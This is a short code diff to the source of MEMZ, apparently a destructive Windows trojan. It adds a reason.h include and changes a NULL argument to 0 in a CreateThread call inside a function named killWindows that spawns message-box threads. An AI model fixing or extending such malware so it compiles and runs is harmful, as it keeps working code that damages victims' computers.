@@ -1,4 +1,5 @@
 #include "../MEMZ.h"
+#include <reason.h>
 
 #ifndef CLEAN
 DWORD WINAPI ripMessageThread(LPVOID parameter);
@@ -36,7 +37,7 @@ void killWindowsInstant() {
 void killWindows() {
 	// Show cool MessageBoxes
 	for (int i = 0; i < 20; i++) {
-		CreateThread(NULL, 4096, &ripMessageThread, NULL, NULL, NULL);
+		CreateThread(NULL, 4096, &ripMessageThread, NULL, 0, NULL);
 		Sleep(100);
 	}
 
